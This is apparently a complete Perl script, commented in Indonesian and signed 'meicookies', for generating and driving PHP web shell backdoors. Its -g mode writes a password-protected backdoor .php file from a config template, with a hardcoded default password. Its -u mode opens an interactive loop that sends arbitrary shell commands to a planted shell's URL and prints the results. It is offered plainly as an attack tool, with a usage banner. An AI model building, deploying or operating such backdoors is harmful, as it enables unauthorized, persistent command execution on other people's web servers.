#!/usr/bin/perl
use strict;
use warnings;
use Getopt::Long;
use Config::IniFiles;
use LWP::UserAgent;
use IO::Prompt;

# Variabel argumen
my ($url, $generate, $passwd);

# Parsing argumen
GetOptions(
    "url=s"      => \$url,
    "g=s"        => \$generate,
    "p=s"        => \$passwd,
);

# Default password jika tidak ada
$passwd = $passwd // 'mei1337';

# Mode generate backdoor
if ($generate) {
    my $shell_name = $generate . '.php';
    my $cfg = Config::IniFiles->new( -file => 'config.ini' );
    my $code_template = $cfg->val('DEFAULT', 'code');
    $code_template =~ s/\{passw\}/$passwd/g;

    open(my $fh, '>', $shell_name) or die "Gagal membuka file $shell_name: $!";
    print $fh $code_template;
    close($fh);

    print "Backdoor berhasil dibuat: $shell_name dengan password: $passwd\n";
    exit;
}

# Mode akses shell via URL
if ($url) {
    my $ua = LWP::UserAgent->new;
    my $prompt = $ua->get("$url?passwd=$passwd&c=pwd")->decoded_content;
    $prompt =~ s/\n//g;
    $prompt .= '$ ';

    while (1) {
        my $command = prompt($prompt);
        my $res = $ua->get("$url?passwd=$passwd&c=$command")->decoded_content;
        print "$res\n";
    }
}
print <<"END";
Perl shell - ./meicookies |
Generate :
[+] ./shell.pl -g "nama_shell" -p "password"
Connect Server :
[+] ./shell.pl -u "url_shell" -p "password"
END
